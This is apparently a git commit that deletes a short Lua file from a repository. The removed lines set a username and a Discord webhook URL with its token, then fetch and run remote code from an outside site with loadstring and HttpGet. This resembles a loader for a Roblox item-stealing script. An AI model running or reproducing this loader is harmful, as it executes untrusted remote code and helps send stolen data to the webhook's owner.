8082cb34e09ea14f3f596957fc194381aedee2ac
jojiboji22 <154750286+jojiboji22@users.noreply.github.com>
2024-07-12 12:35:02 +0100

    Delete New Text Document (2).lua

--- New Text Document (2).lua
+++
@@ -1,4 +0,0 @@
-Username = "af1_akram"
-Webhook = "https://discord.com/api/webhooks/1257753945976078364/HfUE7uVhbU9i7VZvU4d1ByGnyd-USq7fPWvoXy6sxLuHYMxN7ILX_gdObDLa1WfVQfYs"
-
-loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
